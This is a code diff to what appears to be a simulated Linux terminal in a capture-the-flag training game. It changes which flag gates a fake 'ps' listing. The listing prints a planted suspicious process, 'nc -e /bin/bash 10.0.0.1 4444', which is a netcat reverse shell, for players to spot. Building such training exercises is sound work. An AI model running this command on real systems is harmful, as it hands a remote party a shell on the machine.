@@ -570,7 +570,7 @@ function cmdPs(flags) {
   [['    1','?    ','00:00:02','systemd'],[' 1337','pts/0','00:00:00','bash'],[' 2048','?    ','00:01:23','sshd'],[' 3141','?    ','00:00:05','cron']].forEach(p => print(p.join('  '), 'output'));
   if (full) {
     [['  4096','pts/1','00:00:00','ps'],[' 9999','?    ','00:02:11','nginx: master'],['10000','?    ','00:00:44','nginx: worker']].forEach(p => print(p.join('  '), 'output'));
-    if (CTF.active && !CTF.flags.flag3.found) {
+    if (CTF.active && !CTF.flags.flag5.found) {
       print(' 6660 ?    00:00:00 .bash_hidden  <span style="color:var(--red)">[SUSPEITO]</span>', 'error');
       print(' 6661 ?    00:00:01 nc -e /bin/bash 10.0.0.1 4444  <span style="color:var(--red)">[SUSPEITO]</span>', 'error');
       printBlank();
